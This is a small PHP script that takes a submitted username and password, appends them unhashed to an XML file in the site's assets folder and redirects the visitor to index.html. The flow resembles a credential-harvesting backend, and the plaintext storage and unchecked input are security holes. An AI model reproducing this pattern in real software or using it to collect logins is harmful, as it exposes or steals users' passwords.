<?php
    
    //Set the redirect to the index page, so it does not link to a php page.
    header('Location: index.html');

    //If the input is usable, assign it to variables respectively
    if(isset($_POST['usern']) And isset($_POST['passw'])) {
        $username = $_POST['usern'];
        $password = $_POST['passw'];
    }

    //We use simplexml's library to write to XML
    $xml = simplexml_load_file("assets/xml/userinfo.xml");
    
    
    $newnode = $xml->disclaimer;
    
    //Create a child for each username and password to be held
    $node = $newnode->addChild('user');
    $node->addChild('username', $username);
    $node->addChild('password', $password);

    //This section is to get the formal XML output, with the correct indentations
    $dom = new DOMDocument('1.0');
    $dom->preserveWhiteSpace = false;
    $dom->formatOutput = true;
    $dom->loadXML($xml->asXML());
    $dom->save('assets/xml/userinfo.xml');

?>
